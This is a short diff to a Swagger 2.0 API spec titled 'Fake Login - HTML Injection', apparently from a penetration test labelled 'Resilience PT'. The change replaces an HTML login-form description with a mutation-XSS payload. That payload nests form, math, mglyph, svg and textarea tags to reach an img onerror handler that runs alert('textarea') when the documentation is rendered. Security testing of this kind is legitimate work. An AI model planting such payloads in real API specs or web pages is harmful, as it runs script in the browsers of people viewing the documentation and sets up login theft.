@@ -2,14 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login - HTML Injection
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>HTML Injection : Resilience PT</h1>
-    </div>
-    <div class="form-container">
-        </form>
-    </div>
-</div>'
+  description: '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>'
 paths:
   /:
     post:
